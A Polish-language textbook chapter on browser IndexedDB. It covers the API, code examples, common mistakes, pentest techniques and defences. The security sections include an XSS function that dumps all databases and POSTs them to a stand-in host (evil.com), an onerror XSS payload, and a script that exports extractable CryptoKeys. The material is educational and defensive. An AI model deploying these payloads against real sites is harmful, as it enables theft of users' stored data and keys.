# Rozdział 17: IndexedDB

## 1. Czym jest IndexedDB

**IndexedDB** to niskopoziomowa, asynchroniczna baza danych wbudowana w przeglądarkę, umożliwiająca przechowywanie dużych ilości ustrukturyzowanych danych — w tym plików i blobów — po stronie klienta. Jest to najpotężniejszy z mechanizmów client-side storage, oferujący możliwości zbliżone do relacyjnych baz danych, ale z modelem NoSQL opartym na kluczach i indeksach.

W odróżnieniu od localStorage i sessionStorage:
- Działa **asynchronicznie** — nie blokuje Event Loop
- Przechowuje **JavaScript objects** bez konieczności serializacji do stringa
- Obsługuje **transakcje** (ACID częściowo)
- Pozwala na **indeksowanie** i złożone zapytania
- Limit pojemności: dziesiątki do setek MB (zależy od przeglądarki i dostępnego miejsca na dysku)

IndexedDB jest fundamentem dla Progressive Web Apps (PWA), offline-first aplikacji i narzędzi wymagających lokalnego cache'owania dużych zbiorów danych.

---

## 2. Dlaczego powstał

### Problem: brak możliwości localStorage

localStorage z limitem ~5 MB i synchronicznym API był niewystarczający dla:
- Aplikacji offline-first (mapy, dokumenty, email)
- Buforowania dużych zasobów (multimedia, bazy danych produktów)
- Złożonych zapytań po stronie klienta

### Historia: Web SQL Database → IndexedDB

Wcześniejszym standardem było **Web SQL Database** (SQLite w przeglądarce), który:
- Używał SQL przez JavaScript
- Był implementowany przez WebKit/Blink
- Został **zdeprecjonowany przez W3C w 2010** z powodu braku interoperabilności (tylko SQLite jako silnik)

IndexedDB (specyfikacja W3C, implementacja od 2012) zastąpił Web SQL podejściem NoSQL:
- Brak SQL — zamiast tego transakcje i cursor API
- Standard wspierany przez wszystkie główne przeglądarki
- Podstawa dla Service Worker cache i offline functionality

---

## 3. Jak działa

### Architektura

```
┌─────────────────────────────────────────────────────┐
│                   Origin (app.example.com)          │
│                                                     │
│  ┌──────────────────────────────────────────────┐   │
│  │          IndexedDB Database: "myApp"         │   │
│  │                                              │   │
│  │  ┌────────────────┐  ┌────────────────────┐  │   │
│  │  │  Object Store  │  │   Object Store     │  │   │
│  │  │   "users"      │  │   "products"       │  │   │
│  │  │                │  │                    │  │   │
│  │  │ Key: userId    │  │ Key: productId     │  │   │
│  │  │ ┌────────────┐ │  │ ┌────────────────┐ │  │   │
│  │  │ │ {id, name, │ │  │ │ {id, name,     │ │  │   │
│  │  │ │  email,... │ │  │ │  price, ...}   │ │  │   │
│  │  │ └────────────┘ │  │ └────────────────┘ │  │   │
│  │  │                │  │                    │  │   │
│  │  │ Index: email   │  │ Index: category    │  │   │
│  │  └────────────────┘  └────────────────────┘  │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

### Kluczowe koncepty

**Database** — kontener najwyższego poziomu, identyfikowany nazwą i numerem wersji.

**Object Store** — analogia do tabeli w SQL lub kolekcji w MongoDB. Przechowuje rekordy (JavaScript objects) indeksowane kluczem.

**Key Path** — właściwość obiektu używana jako klucz (np. `"id"`), lub klucz zewnętrzny, lub auto-increment.

**Index** — dodatkowy mechanizm wyszukiwania po właściwościach innych niż klucz główny.

**Transaction** — każda operacja na danych odbywa się w ramach transakcji. Tryby: `readonly`, `readwrite`, `versionchange`.

**Cursor** — mechanizm iterowania po rekordach (jak iterator bazodanowy).

### Cykl życia transakcji

```
openDB() → onupgradeneeded (schemat) → onsuccess
                    ↓
            db.transaction([store], mode)
                    ↓
            transaction.objectStore(storeName)
                    ↓
            store.add() / store.get() / store.put() / store.delete()
                    ↓
            request.onsuccess / request.onerror
                    ↓
            transaction.oncomplete / transaction.onerror
```

### Asynchroniczność — model request/event

IndexedDB nie używa Promises natywnie (starsze API z 2012). Każda operacja zwraca `IDBRequest` z callbackami `onsuccess` i `onerror`. Nowoczesne biblioteki (idb) owijają to w Promise/async.

---

## 4. Co dzieje się wewnętrznie

### Przechowywanie na dysku

IndexedDB jest przechowywane na dysku, w katalogu profilu przeglądarki:
- Chrome: `~/.config/google-chrome/Default/IndexedDB/`
- Firefox: `~/.mozilla/firefox/<profile>/storage/default/`

Format: Chrome używa LevelDB (klucz-wartość, pliki `.ldb`). Firefox używa SQLite.

### Structured Clone Algorithm

IndexedDB serializuje dane przez **Structured Clone Algorithm** — to ważny szczegół. Structured Clone obsługuje więcej typów niż JSON.stringify:
- `Date` → zachowany jako Date (nie string)
- `Map`, `Set` → zachowane
- `ArrayBuffer`, `Blob`, `File` → zachowane
- `undefined` → zachowane
- `Infinity`, `NaN` → zachowane
- **Czego NIE obsługuje:** funkcje, DOM nodes, gettery/settery (tylko wartości)

```javascript
// JSON.stringify vs Structured Clone
const obj = { date: new Date(), map: new Map([["a", 1]]) };
JSON.stringify(obj); 
// {"date":"2024-01-01T...","map":{}} ← Map utracona!

// IndexedDB (Structured Clone):
store.put(obj); // Date i Map zachowane!
```

### Scope i izolacja

IndexedDB jest izolowane **per-origin** (jak localStorage), ale w odróżnieniu od sessionStorage — współdzielone między kartami tego samego origin i persystentne między sesjami.

---

## 5. Analogiczny przykład z życia

IndexedDB to prywatna kartoteka w biurze:

- Każda firma (origin) ma własną kartotekę (baza danych)
- Kartoteka ma szuflady (Object Stores) — "klienci", "faktury", "produkty"
- Każdy dokument ma numer (klucz) i można go wyszukać po różnych polach (indeksy)
- Operacje wykonuje się przez zamówienie pliku (request) — asystent przynosi go gdy gotowy
- Modyfikacje wymagają podpisania formularza (transakcja) — jeśli coś pójdzie nie tak, wszystko anulowane

---

## 6. Przykład kodu

```javascript
// === Pełny wzorzec IndexedDB z async/await (biblioteka idb) ===
// npm install idb
import { openDB } from 'idb';

// Otwórz lub utwórz bazę danych
async function initDB() {
    const db = await openDB('SecureApp', 1, {
        upgrade(db) {
            // Tworzenie Object Store (tylko w upgrade)
            const store = db.createObjectStore('users', {
                keyPath: 'id',
                autoIncrement: true
            });
            // Indeks po email (unique)
            store.createIndex('email', 'email', { unique: true });
            // Indeks po roli (nie unique)
            store.createIndex('role', 'role', { unique: false });
        }
    });
    return db;
}

// CRUD operations
const db = await initDB();

// CREATE
await db.add('users', {
    name: 'Jan Kowalski',
    email: 'jan@example.com',
    role: 'user',
    createdAt: new Date() // Date zachowana przez Structured Clone
});

// READ by key
const user = await db.get('users', 1);

// READ by index
const userByEmail = await db.getFromIndex('users', 'email', 'jan@example.com');

// UPDATE
await db.put('users', { ...user, role: 'admin' });

// DELETE
await db.delete('users', 1);

// GET ALL
const allUsers = await db.getAll('users');

// COUNT
const count = await db.count('users');

// TRANSACTION (manual, read-write)
const tx = db.transaction('users', 'readwrite');
await tx.store.add({ name: 'Test', email: 'test@example.com', role: 'user' });
await tx.done; // czeka na commit

// === Natywne API (bez biblioteki) ===
const request = indexedDB.open('NativeExample', 1);

request.onupgradeneeded = (event) => {
    const db = event.target.result;
    db.createObjectStore('notes', { keyPath: 'id', autoIncrement: true });
};

request.onsuccess = (event) => {
    const db = event.target.result;
    const tx = db.transaction('notes', 'readwrite');
    const store = tx.objectStore('notes');
    
    const addRequest = store.add({ text: 'Notatka', timestamp: Date.now() });
    addRequest.onsuccess = () => console.log('Dodano:', addRequest.result);
    
    tx.oncomplete = () => console.log('Transakcja zakończona');
    tx.onerror = () => console.error('Błąd:', tx.error);
};
```

---

## 7. Przykład z prawdziwej aplikacji

### PWA — offline email client

```javascript
// Offline email client — IndexedDB jako local store
const EmailDB = {
    async init() {
        this.db = await openDB('EmailClient', 2, {
            upgrade(db, oldVersion) {
                if (oldVersion < 1) {
                    const emails = db.createObjectStore('emails', { keyPath: 'id' });
                    emails.createIndex('folder', 'folder');
                    emails.createIndex('timestamp', 'timestamp');
                    emails.createIndex('unread', 'unread');
                }
                if (oldVersion < 2) {
                    // Migration: dodaj indeks po nadawcy
                    const emails = db.transaction.objectStore('emails');
                    emails.createIndex('sender', 'sender');
                }
            }
        });
    },
    
    async syncFromServer(emails) {
        const tx = this.db.transaction('emails', 'readwrite');
        for (const email of emails) {
            await tx.store.put(email);
        }
        await tx.done;
    },
    
    async getUnread(folder = 'inbox') {
        // Compound query przez index
        const index = this.db.transaction('emails').store.index('folder');
        const all = await index.getAll(folder);
        return all.filter(e => e.unread);
    },
    
    async search(query) {
        // IndexedDB nie ma full-text search — musimy to zrobić manualnie
        const all = await this.db.getAll('emails');
        return all.filter(e => 
            e.subject?.toLowerCase().includes(query) ||
            e.body?.toLowerCase().includes(query)
        );
    }
};
```

### Cache API data z IndexedDB (Service Worker pattern)

```javascript
// Service Worker + IndexedDB: zapisuj metadane obok Cache API
self.addEventListener('fetch', async (event) => {
    event.respondWith(async function() {
        const cache = await caches.open('v1');
        const cached = await cache.match(event.request);
        
        if (cached) {
            // Loguj odwiedziny do IndexedDB (analytics offline)
            const db = await openDB('Analytics', 1);
            await db.add('pageviews', {
                url: event.request.url,
                timestamp: Date.now(),
                source: 'cache'
            });
            return cached;
        }
        
        const response = await fetch(event.request);
        cache.put(event.request, response.clone());
        return response;
    }());
});
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak obsługi versionchange (multiple tabs)

```javascript
// BŁĄD: dwa taby mają otwartą starą wersję bazy
// Trzecia próbuje ją zaktualizować — blokada!

// POPRAWKA: obsługuj onblocked i onversionchange
const db = await openDB('App', 2, {
    blocked(currentVersion, blockedVersion) {
        alert('Zaktualizuj inne karty aplikacji!');
    }
});

// W otwartej bazie (stara karta):
db.addEventListener('versionchange', () => {
    db.close(); // Pozwól nowszej wersji się zainstalować
    location.reload();
});
```

### Błąd 2: Wyciek transakcji

```javascript
// BŁĄD: transakcja autocommit gdy brak pending requests
const tx = db.transaction('users', 'readwrite');
const store = tx.objectStore('users');

// Po async operacji zewnętrznej — transakcja może być już committed!
await fetch('/api/data'); // ← transakcja wygasła podczas oczekiwania!
store.add({ name: 'Test' }); // Błąd: transaction inactive

// POPRAWKA: nie mieszaj await zewnętrznych operacji w ramach transakcji
const data = await fetch('/api/data').then(r => r.json());
const tx2 = db.transaction('users', 'readwrite'); // nowa transakcja po fetch
await tx2.store.add(data);
await tx2.done;
```

### Błąd 3: Przechowywanie sekretów

```javascript
// BŁĄD: zapisywanie kluczy prywatnych
await db.put('secrets', {
    privateKey: cryptoKey,        // CryptoKey object — Structured Clone go obsługuje!
    rawKeyBytes: new Uint8Array([...]) // ← NIEBEZPIECZNE
});
// Każdy skrypt z tego origin ma dostęp do IndexedDB
// XSS może wyeksfiltrować rawKeyBytes

// POPRAWKA: użyj Web Crypto z non-extractable kluczami
// lub w ogóle nie przechowuj kluczy po stronie klienta
const key = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    false, // extractable: false — nie można wyeksfiltrować!
    ['encrypt', 'decrypt']
);
```

---

## 9. Znaczenie dla bezpieczeństwa

### XSS i pełny dostęp do IndexedDB

IndexedDB jest dostępne z JavaScript tak samo jak localStorage. XSS payload może eksfiltrować całą bazę:

```javascript
// XSS eksfiltracja IndexedDB
async function exfilIndexedDB() {
    const result = {};
    
    // Lista baz danych
    const databases = await indexedDB.databases();
    
    for (const { name, version } of databases) {
        const db = await openDB(name, version);
        result[name] = {};
        
        for (const storeName of db.objectStoreNames) {
            const data = await db.getAll(storeName);
            result[name][storeName] = data;
        }
        
        db.close();
    }
    
    // Eksfiltracja
    await fetch('https://evil.com/steal', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(result)
    });
}

exfilIndexedDB();
```

**Uwaga:** `indexedDB.databases()` nie jest dostępne we wszystkich przeglądarkach (Chrome 72+, Firefox 126+). Ale jeśli atakujący zna nazwę bazy (widoczną w DevTools lub przez analizę JS), może ją otworzyć bezpośrednio.

### Wrażliwe dane w IndexedDB

Ze względu na Structured Clone, IndexedDB może przechowywać **CryptoKey objects** (klucze kryptograficzne). Jeśli klucz jest `extractable: true`, XSS może go wyeksportować:

```javascript
// Jeśli aplikacja zapisała extractable CryptoKey:
const keyRecord = await db.get('keys', 'masterKey');
const exported = await crypto.subtle.exportKey('raw', keyRecord.cryptoKey);
// exported to ArrayBuffer z surowymi bajtami klucza → eksfiltracja
```

### Powiązane CWE

- **CWE-312** — Cleartext Storage of Sensitive Information
- **CWE-922** — Insecure Storage of Sensitive Information
- **CWE-79** — XSS (wektor dostępu do IndexedDB)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → IndexedDB

1. **Application** → **IndexedDB** → rozwiń origin
2. Widoczne są wszystkie bazy, Object Stores, indeksy
3. Kliknij na Object Store → przeglądaj wszystkie rekordy
4. Sprawdź czy są tokeny, dane użytkownika, klucze kryptograficzne

### Console — eksploracja

```javascript
// Lista baz danych (Chrome/Firefox)
await indexedDB.databases();
// → [{name: "myApp", version: 3}, ...]

// Otwórz i przejrzyj konkretną bazę
const db = await new Promise((resolve, reject) => {
    const req = indexedDB.open('myApp');
    req.onsuccess = e => resolve(e.target.result);
    req.onerror = reject;
});

// Lista Object Stores
Array.from(db.objectStoreNames);

// Pobierz wszystko z konkretnego store
const tx = db.transaction('users', 'readonly');
const req = tx.objectStore('users').getAll();
req.onsuccess = () => console.log(req.result);
```

### Burp Suite

IndexedDB jest client-side — nie widać jej w ruchu HTTP. Aby zbadać:
1. Wstrzyknij JS przez Burp (jeśli brak CSP)
2. Użyj Burp's DOM Invader do skanowania storage
3. Ręcznie przez DevTools

---

## 11. Jak testować bezpieczeństwo

```
□ Czy IndexedDB zawiera tokeny, hasła, numery kart, PII?
□ Czy zapisane CryptoKey objects są extractable: false?
□ Czy aplikacja obsługuje versionchange (multi-tab update)?
□ Czy IndexedDB jest czyszczone przy wylogowaniu?
□ Czy dane w IndexedDB są walidowane po stronie serwera?
□ Czy XSS może wyeksfiltrować całą bazę (indexedDB.databases())?
□ Czy dane nie zawierają sekretów API lub kluczy prywatnych?
□ Czy migracje bazy (versionchange) są bezpieczne?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: Persistent XSS przez IndexedDB

**Cel:** Jeśli aplikacja zapisuje dane z serwera do IndexedDB i potem je renderuje.

```javascript
// Podatna aplikacja:
// 1. Pobiera komentarze z API
// 2. Zapisuje do IndexedDB
// 3. Przy następnym uruchomieniu — renderuje z IndexedDB

// Atak:
// Jeśli komentarz zawiera XSS i jest serializowany bez sanityzacji,
// przy kolejnym uruchomieniu offline — XSS wykona się przez IndexedDB

// Payload zapisany przez serwer:
const comment = { text: '<img src=x onerror=alert(1)>', author: 'evil' };
await db.add('comments', comment);

// Późniejszy rendering (podatny):
const comments = await db.getAll('comments');
container.innerHTML = comments.map(c => c.text).join(''); // XSS!
```

### Scenariusz: Kradzież CryptoKey

```javascript
// Aplikacja generuje klucz i zapisuje w IndexedDB
const key = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true, // BŁĄD: extractable! 
    ['encrypt', 'decrypt']
);
await db.put('keys', { id: 'masterKey', key });

// XSS payload:
const record = await db.get('keys', 'masterKey');
const raw = await crypto.subtle.exportKey('raw', record.key);
const b64 = btoa(String.fromCharCode(...new Uint8Array(raw)));
// Teraz b64 = base64 klucza → eksfiltracja
```

---

## 13. Jak się zabezpieczać

```javascript
// 1. Nie przechowuj wrażliwych danych — sanityzuj przed zapisem
async function saveUserData(data) {
    const safe = {
        name: data.name,
        email: data.email,
        preferences: data.preferences
        // NIGDY: password, token, creditCard, ssn
    };
    await db.put('users', safe);
}

// 2. Sanityzuj przed renderowaniem
const items = await db.getAll('notes');
items.forEach(item => {
    const div = document.createElement('div');
    div.textContent = item.text; // textContent, nie innerHTML
    container.appendChild(div);
});

// 3. Czyść przy wylogowaniu
async function logout() {
    // Wyczyść IndexedDB
    await db.clear('users');
    await db.clear('sessions');
    // Lub usuń całą bazę:
    db.close();
    await indexedDB.deleteDatabase('AppDB');
    
    sessionStorage.clear();
    localStorage.clear();
    window.location.href = '/login';
}

// 4. Używaj non-extractable kluczy
const key = await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    false, // extractable: false — bezpieczne
    ['encrypt', 'decrypt']
);
// Taki klucz można zapisać w IndexedDB (Structured Clone)
// ale nie można go wyeksportować nawet przez XSS
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. IndexedDB = asynchroniczna, transakcyjna, per-origin baza NoSQL w przeglądarce
2. Structured Clone Algorithm — przechowuje Date, Map, Set, Blob, CryptoKey (nie tylko stringi)
3. Bez biblioteki (idb) API jest niewygodne — request/event callbacks
4. Tak samo podatne na XSS jak localStorage — XSS ma pełny dostęp
5. Persystentne między sesjami (w odróżnieniu od sessionStorage)
6. CryptoKey zapisane z `extractable: true` może być wykradzione przez XSS

**Dla pentestera:**
- **Application → IndexedDB** w DevTools to pierwsze miejsce do sprawdzenia
- `indexedDB.databases()` w konsoli daje listę wszystkich baz
- Szukaj kluczy kryptograficznych, tokenów, PII, danych biznesowych
- Sprawdź czy dane są renderowane bez sanityzacji (stored XSS vector)

---

## Powiązania

```
IndexedDB
    │
    ├──► localStorage (Rozdział 15)
    │         Synchroniczne, prostsze API — mały rozmiar
    │
    ├──► Cache API (Rozdział 18)
    │         Przechowuje pary Request/Response — HTTP cache
    │         Często używane razem z IndexedDB w Service Workers
    │
    ├──► Service Workers (Rozdział 19)
    │         IndexedDB dostępne w Service Worker context
    │
    └──► Web Crypto API
              CryptoKey objects są Structured Cloneable
              non-extractable klucze można bezpiecznie przechowywać
```
